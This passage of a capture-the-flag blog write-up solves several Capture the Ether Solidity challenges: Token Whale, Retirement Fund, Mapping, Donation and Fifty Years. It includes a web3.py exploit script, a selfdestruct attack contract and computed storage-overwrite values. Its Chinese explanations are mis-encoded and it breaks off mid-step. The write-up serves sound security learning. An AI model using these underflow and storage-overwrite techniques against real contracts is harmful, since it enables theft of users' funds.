class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;owner&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;spender&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: false,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;Approval&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;event&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    function transferFrom(address from, address to, uint256 value) public &#123;</span></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[api_key]&quot;</span>))</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line"></span><br><span class="line">MasterAccount = w3.eth.account.from_key(MasterPrivKey)</span><br><span class="line">HelpAccount   = w3.eth.account.from_key(HelpPrivKey)</span><br><span class="line"><span class="comment"># setp1</span></span><br><span class="line">log.info(<span class="string">&quot;Step1 , Transfer to HELP Account: 800 value &quot;</span>)</span><br><span class="line"><span class="comment">#    function transfer(address to, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.transfer(HelpAccount.address, <span class="number">800</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(MasterAccount.address),</span><br><span class="line">       <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed =  MasterAccount.signTransaction(tx)</span><br><span class="line">tx_id  =  w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step1 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 </span></span><br><span class="line">log.info(<span class="string">&quot;Step2 , Call approve&quot;</span>)</span><br><span class="line"><span class="comment">#    unction approve(address spender, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.approve(MasterAccount.address, <span class="number">1000</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(HelpAccount.address),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed = HelpAccount.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step2 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 transferFrom(address)</span></span><br><span class="line">log.info(<span class="string">&quot;Step3 , call transferFrom to solve challenge&quot;</span>)</span><br><span class="line"><span class="comment">#    function transferFrom(address from, address to, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.transferFrom(HelpAccount.address,HelpAccount.address, <span class="number">500</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(MasterAccount.address),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed =  MasterAccount.signTransaction(tx)</span><br><span class="line">tx_id  =  w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step3 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(contract.functions.isComplete().call())</span><br><span class="line">log.success(<span class="string">&quot;Solved !&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-Retirement-fund"><a href="#3-Retirement-fund" class="headerlink" title="3. Retirement fund"></a>3. Retirement fund</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This retirement fund is what economists call aÂ <a href="https://en.wikipedia.org/wiki/Commitment_device">commitment device</a>. Iâ€™m trying to make sure I hold on to 1 ether for retirement.</p><p>Iâ€™ve committed 1 ether to the contract below, and I wonâ€™t withdraw it until 10 years have passed. If IÂ <em>do</em>Â withdraw early, 10% of my ether goes to theÂ <code>beneficiary</code>Â (you!).</p><p>I really donâ€™t want you to have 0.1 of my ether, so Iâ€™m resolved to leave those funds alone until 10 years from now. Good luck!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner &#x3D; msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration &#x3D; now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary &#x3D; player;</span><br><span class="line">        startBalance &#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            &#x2F;&#x2F; early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 &#x2F; 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn &#x3D; startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; an early withdrawal occurred</span><br><span class="line">        require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; penalty is what&#39;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=Mx0xCI1jaUM">Smooth Criminal</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®è®¾ç½®äº†ä¸€ä¸ªåå¹´åæ‰èƒ½å–å‡º eth çš„åˆçº¦ï¼Œ è¦æ±‚æˆ‘ä»¬æå‰å–å‡ºæ‰€æœ‰çš„ Balance ã€‚é‡ç‚¹åœ¨  <code>collectPenalty</code> å‡½æ•°ä¸Šã€‚</p><p>å¦‚æœæˆ‘ä»¬èƒ½ä½¿å¾— <code>withdrawn &gt; 0</code>  æˆç«‹ï¼Œ åˆ™å¯ä»¥å–å‡ºæ‰€æœ‰çš„æ¶ balance , æˆ‘ä»¬ä¼šæ³¨æ„åˆ°   <code>startBalance - address(this).balance</code>  å­˜åœ¨æº¢å‡ºï¼Œ ä½†æ˜¯æ¡ä»¶å¾—æ˜¯ <code>startBalance</code>  å°äº <code>address(this).balance</code> ã€‚ </p><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><p>Â <code>SELFDESTRUCT</code>Â å‡½æ•°å¯ä»¥å¼ºåˆ¶å‘é€ ETHï¼š</p><p><code>SELFDESTRUCT</code>  æ˜¯ä¸€ä¸ªè‡ªæ¯å‡½æ•°ï¼Œå½“ä½ è°ƒç”¨å®ƒçš„æ—¶å€™ï¼Œå®ƒä¼šä½¿è¯¥åˆçº¦æ— æ•ˆåŒ–å¹¶åˆ é™¤è¯¥åœ°å€çš„å­—èŠ‚ç ï¼Œç„¶åå®ƒä¼šæŠŠåˆçº¦é‡Œå‰©ä½™çš„balanceå‘é€ç»™å‚æ•°æ‰€æŒ‡å®šçš„åœ°å€ï¼Œæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯è¿™ç¬”etherçš„å‘é€å°†æ— è§†åˆçº¦çš„fallbackå‡½æ•°ï¼Œæ‰€ä»¥å®ƒæ˜¯å¼ºåˆ¶æ€§çš„ ã€‚</p><p>æ”»å‡»åˆçº¦ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line"></span><br><span class="line">function ForceAttack(address target) public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0);</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png"></a></p><p>æœ€åè°ƒç”¨ <code>collectPenalty</code>  å‡½æ•°å³å¯ã€‚</p><h3 id="4-Mapping"><a href="#4-Mapping" class="headerlink" title="4. Mapping"></a>4. Mapping</h3><p><strong>é¢˜ç›®æè¿°:</strong></p><p>MATH: 750 POINTS</p><p><a href="https://capturetheether.com/challenges/math/mapping/#">Begin Challenge</a></p><p>Who needsÂ <code>mapping</code>s? Iâ€™ve created a contract that can store key/value pairs using just an array.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        &#x2F;&#x2F; Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;&#x3D; key) &#123;</span><br><span class="line">            map.length &#x3D; key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=A259WnFMRXI">Map To My Heart</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®è®¾ç½®äº† ä¸€ä¸ª map ï¼Œ æˆ‘ä»¬å¯ä»¥å¯¹ map è¿›è¡Œæ“ä½œï¼Œ è¦æ±‚å°† <code>isComplete</code> è®¾ç½®ä¸º True å³å¯ã€‚ æ„Ÿè§‰å°±æ˜¯æº¢å‡º map çš„ç©ºé—´ï¼Œè¦†ç›–åˆ° <code>isComplete</code>  çš„ä½ç½®å³å¯ã€‚</p><p>é€šè¿‡äº†è§£ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åŠ¨æ€æ•°ç»„ï¼Œå…¶åœ¨å£°æ˜ä¸­æ‰€åœ¨ä½ç½®å†³å®šçš„å­˜å‚¨ä½é‡Œå­˜æ”¾çš„æ˜¯å…¶é•¿åº¦ï¼Œè€Œå…¶ä¸­çš„å˜é‡çš„å­˜å‚¨ä½åˆ™æ˜¯åŸºäºå…¶é•¿åº¦æ‰€åœ¨çš„å­˜å‚¨è¿›è¡Œï¼Œè¿™éƒ¨åˆ†çš„è¯¦ç»†å†…å®¹å¯ä»¥å‚è§æ­¤å¤„ä¸€ç¯‡ç¿»è¯‘æ–‡ç« <a href="https://segmentfault.com/a/1190000013791133">äº†è§£ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å­˜å‚¨</a></p><p>solidityçš„storage slotå­˜å‚¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">slot 0: isComplete</span><br><span class="line">slot 1: map.length</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">slot keccak(1): map[0]</span><br><span class="line">slot keccak(1) + 1: map[1]</span><br><span class="line">slot keccak(1) + 2: map[2]</span><br><span class="line">slot keccak(1) + 3: map[3]</span><br><span class="line">slot keccak(1) + 4: map[4]</span><br><span class="line">&#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure><p>åŠ¨æ€æ•°ç»„å†…å˜é‡æ‰€åœ¨çš„å­˜å‚¨ä½çš„è®¡ç®—å…¬å¼å³ä¸º</p><blockquote><p>keccak256(slot) + index</p></blockquote><p>map.length = key + 1;<br>å½“map.lengthæº¢å‡ºä¼šå›ç»•åˆ°slot 0 å³å¯å®ŒæˆisCompleteçš„è¦†ç›–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; binascii.unhexlify(&#39;%064x&#39; % 1)</span><br><span class="line">&gt;&gt;&gt; Web3.keccak(a)</span><br><span class="line">HexBytes(&#39;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6&#39;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 2**256 - int(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)</span><br><span class="line">35707666377435648211887908874984608119992236509074197713628505308453184860938</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ™åœ¨ <code>35707666377435648211887908874984608119992236509074197713628505308453184860938</code>  ä½ç½®è®¾ç½®ä¸º 1 å³å¯ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png"></a></p><h3 id="5-Donation"><a href="#5-Donation" class="headerlink" title="5. Donation"></a>5. Donation</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>A candidate you donâ€™t like is accepting campaign contributions via the smart contract below.</p><p>To complete this challenge, steal the candidateâ€™s ether.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        &#x2F;&#x2F; amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale &#x3D; 10**18 * 1 ether;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; etherAmount &#x2F; scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp &#x3D; now;</span><br><span class="line">        donation.etherAmount &#x3D; etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=_AUXpnB065o">Space Force</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå˜é‡è¦†ç›–é¢˜ç›®ã€‚  Structåœ¨å‡½æ•°å†…éæ˜¾å¼åœ°åˆå§‹åŒ–çš„æ—¶å€™ä¼šä½¿ç”¨storageå­˜å‚¨è€Œä¸æ˜¯memoryã€‚å…·ä½“è®²å°±æ˜¯ <code>donate()</code>Â ä¸­Â <code>donation</code>Â å®šä¹‰æ—¶æœªæŒ‡å®šå¼•ç”¨ï¼Œé»˜è®¤æŒ‡å‘ slot0 ã€‚ å› æ­¤æˆ‘ä»¬å¯è¦†ç›–solt 0å’Œslot 1å¤„1å­˜å‚¨çš„çŠ¶æ€å˜é‡ï¼Œæ°å¥½solt 1å­˜å‚¨çš„å³ä¸ºowner</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Donation donation;</span><br><span class="line">donation.timestamp &#x3D; now;</span><br><span class="line">donation.etherAmount &#x3D; etherAmount;</span><br><span class="line"></span><br><span class="line">nowè¦†ç›–slot(0) etherAmountè¦†ç›–slot(1) åˆ©ç”¨etherAmountè¦†ç›–owner</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å°† owner è¦†ç›–ä¸ºæˆ‘ä»¬çš„è´¦æˆ·ï¼Œ ç„¶åå°† balance å–å‡ºã€‚</p><p>æ”»å‡»ï¼š è®¾ç½® value æ»¡è¶³è¦æ±‚ï¼Œå³  <code>address // 10**36</code> , è®¾ç½® etherAmount çš„å€¼ä¸ºæˆ‘çš„åœ°å€</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png"></a></p><p>æ”»å‡»åï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png"></a></p><p>è¿™æ ·æˆ‘å°±å¯ä»¥å°† balance å…¨éƒ¨å–å‡ºäº†ã€‚</p><h3 id="6-Fifty-years"><a href="#6-Fifty-years" class="headerlink" title="6. Fifty years"></a>6. Fifty years</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later.</p><p>All you have to do to complete this challenge is wait 50 years and withdraw the ether. If youâ€™re not that patient, youâ€™ll need to combine several techniques to hack this contract.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function FiftyYearsChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        owner &#x3D; player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + 50 years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upsert(uint256 index, uint256 timestamp) public payable &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        if (index &gt;&#x3D; head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            &#x2F;&#x2F; Update existing contribution amount without updating timestamp.</span><br><span class="line">            Contribution storage contribution &#x3D; queue[index];</span><br><span class="line">            contribution.amount +&#x3D; msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; Append a new contribution. Require that each contribution unlock</span><br><span class="line">            &#x2F;&#x2F; at least 1 day after the previous one.</span><br><span class="line">            require(timestamp &gt;&#x3D; queue[queue.length - 1].unlockTimestamp + 1 days);</span><br><span class="line"></span><br><span class="line">            contribution.amount &#x3D; msg.value;</span><br><span class="line">            contribution.unlockTimestamp &#x3D; timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 index) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        require(now &gt;&#x3D; queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Withdraw this and any earlier contributions.</span><br><span class="line">        uint256 total &#x3D; 0;</span><br><span class="line">        for (uint256 i &#x3D; head; i &lt;&#x3D; index; i++) &#123;</span><br><span class="line">            total +&#x3D; queue[i].amount;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Reclaim storage.</span><br><span class="line">            delete queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Move the head of the queue forward so we don&#39;t have to loop over</span><br><span class="line">        &#x2F;&#x2F; already-withdrawn contributions.</span><br><span class="line">        head &#x3D; index + 1;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=tR-qQcNT_fY">100 Years</a>. I guess just listen to half of it.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é€šè¿‡å‰é¢å‡ å¤©é¢˜ï¼Œæˆ‘å¯ä»¥çŸ¥é“ä»¥ä¸‹æš‚æ—¶å¯ä»¥å¾—åˆ°ä¿¡æ¯ï¼š</p><ol><li><p>å‡½æ•°é‡Œä½¿ç”¨äº†storageå­˜å‚¨æ¥åˆå§‹åŒ–ä¸€ä¸ªcontributionç»“æ„ä½“ï¼Œ å› æ­¤æˆ‘ä»¬å¯ä»¥è¦†ç›– queue çš„é•¿åº¦ä»¥åŠ head çš„å€¼ã€‚</p><pre><code>  msg.valueè¦†ç›–slot(0) -&gt; queue.length  timestampè¦†ç›–slot(1) -&gt; head</code></pre></li><li><p>æº¢å‡ºæ¼æ´ï¼š <code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</code></p><p>queue çš„é•¿åº¦å¯æ§ï¼Œ åŠ¨æ€æ•°ç»„queue çš„å˜é‡æ‰€åœ¨çš„å­˜å‚¨ä½è®¡ç®—è§„åˆ™ä¸º <code>keccak256(slot) + index * elementsize</code> ,  <code>elementsize</code>  å³ä¸ºç»“æ„ä½“Contributionçš„size</p></li></ol><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li><p>å¯åŠ¨åˆçº¦ï¼Œæ­¤æ—¶ queue.length =1ï¼Œ head = 0</p></li><li><p>è°ƒç”¨ <code>upsert(1, 2**256-24*60*60)</code>  é€šè¿‡æº¢å‡ºç»•è¿‡ <code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</code> æ£€æŸ¥ï¼Œå³ 2**256 + 24 * 60 * 60 = 0ï¼›</p><p>æ­¤æ—¶ queue.length = 1 &amp; head = 